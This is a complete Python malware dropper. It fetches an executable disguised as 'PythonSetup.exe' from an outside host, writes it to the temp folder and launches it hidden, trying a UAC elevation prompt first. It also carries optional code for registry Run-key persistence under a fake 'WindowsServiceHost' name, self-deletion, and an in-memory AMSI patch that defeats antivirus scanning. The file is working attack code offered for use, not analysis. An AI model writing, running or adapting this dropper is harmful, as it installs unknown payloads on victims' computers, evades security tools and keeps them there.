# -*- coding: utf-8 -*-
# py-dropper: fetch over HTTP(S) -> %TEMP% -> detached exec
import os, sys, time, tempfile, subprocess
import urllib.request
try:
    from urllib.request import urlopen
except ImportError:
    from urllib2 import urlopen

URL  = r'''https://driveme2026.shop/pad8DeDlCtY8/ONhcxe032mLi/PythonSetup.exe'''
NAME = r'''LNKBUILD.exe'''
HIDE = True
PERSIST = False
SELF_DELETE = False
AMSI_GUARD = False

LOG = os.path.join(tempfile.gettempdir(), '~dropper.log')

def log(msg):
    try:
        with open(LOG, 'a', encoding='utf-8') as f:
            f.write(str(msg) + chr(10))
    except Exception:
        pass

def temp_path(name):
    d = tempfile.gettempdir()
    p = os.path.join(d, name)
    try:
        if os.path.exists(p):
            os.chmod(p, 0o666)
            os.remove(p)
    except Exception as e:
        log('temp_path: ' + repr(e))
    return p

def http_get(url):
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
    last = None
    for attempt in range(4):
        try:
            req = urllib.request.Request(url, headers={'User-Agent': ua})
            with urlopen(req, timeout=60) as r:
                return r.read()
        except Exception as e:
            last = e
            time.sleep(2 + attempt * 3)
    log('http_get failed: ' + repr(last))
    return None

def run_detached(path, hide):
    # ShellExecute умеет UAC (runas) - нужен для манифестов requireAdministrator
    if os.name == 'nt':
        import ctypes
        try:
            os.chmod(path, 0o777)
        except Exception:
            pass
        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
        shell32.ShellExecuteW.restype = ctypes.c_void_p
        shell32.ShellExecuteW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_wchar_p,
                                            ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_int]
        nshow = 0 if hide else 1
        # 1) elevation (runas) - для requireAdministrator
        r = shell32.ShellExecuteW(None, 'runas', path, None, os.path.dirname(path), nshow)
        log('ShellExecute runas -> ' + str(r))
        if r > 32:
            return True
        # 2) UAC отклонили или манифест asInvoker - обычное открытие
        r = shell32.ShellExecuteW(None, 'open', path, None, os.path.dirname(path), nshow)
        log('ShellExecute open -> ' + str(r))
        if r > 32:
            return True
        # 3) крайний случай - прямой CreateProcess
        try:
            flags = 0x00000008 | 0x00000200
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = nshow
            subprocess.Popen([path], close_fds=True, creationflags=flags, startupinfo=si)
            return True
        except Exception as e:
            log('Popen fallback failed: ' + repr(e))
            return False
    else:
        os.chmod(path, 0o755)
        subprocess.Popen([path], close_fds=True, start_new_session=True)
        return True

def do_persist(path):
    if os.name != 'nt':
        return
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r'Software\Microsoft\Windows\CurrentVersion\Run',
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WindowsServiceHost', 0, winreg.REG_SZ, '"' + path + '"')
        winreg.CloseKey(key)
    except Exception as e:
        log('persist: ' + repr(e))

def unlink_self():
    if os.name != 'nt':
        return
    try:
        me = os.path.abspath(sys.argv[0])
        cmd = 'ping 127.0.0.1 -n 3 >nul & del /f /q "' + me + '"'
        subprocess.Popen(['cmd.exe', '/c', cmd],
                         creationflags=0x08000000, close_fds=True)
    except Exception as e:
        log('unlink_self: ' + repr(e))

def amsi_bypass():
    # mov eax,0x80070057 ; ret  -> E_INVALIDARG
    if os.name != 'nt':
        return True
    import ctypes
    from ctypes import wintypes
    try:
        k32 = ctypes.WinDLL('kernel32', use_last_error=True)
        k32.GetModuleHandleA.restype = ctypes.c_void_p
        k32.GetProcAddress.restype = ctypes.c_void_p
        k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        k32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
                                        wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
        h = k32.GetModuleHandleA(b'amsi.dll')
        if not h:
            log('amsi: amsi.dll not loaded')
            return False
        p = k32.GetProcAddress(h, b'AmsiScanBuffer')
        if not p:
            log('amsi: AmsiScanBuffer not found')
            return False
        patch = b'\xB8\x57\x00\x07\x80\xC3'
        old = wintypes.DWORD(0)
        k32.VirtualProtect(p, len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(p, patch, len(patch))
        k32.VirtualProtect(p, len(patch), old.value, ctypes.byref(old))
        log('amsi: patched ok')
        return True
    except Exception as e:
        log('amsi: ' + repr(e))
        return False


def main():
    dst = temp_path(NAME)
    data = http_get(URL)
    if not data:
        log("download failed"); return 1
    log("downloaded %d bytes" % len(data))
    with open(dst, "wb") as f:
        f.write(data)
    log("written " + dst)
    if AMSI_GUARD:
        amsi_bypass()
    if PERSIST:
        do_persist(dst)
    ok = run_detached(dst, HIDE)
    log("launch result: " + str(ok))
    return 0 if ok else 2

if __name__ == "__main__":
    rc = 1
    try:
        rc = main()
    except SystemExit as e:
        rc = e.code if isinstance(e.code, int) else 1
    except Exception:
        import traceback
        log("FATAL:" + chr(10) + traceback.format_exc())
    if SELF_DELETE:
        unlink_self()
    sys.exit(rc)
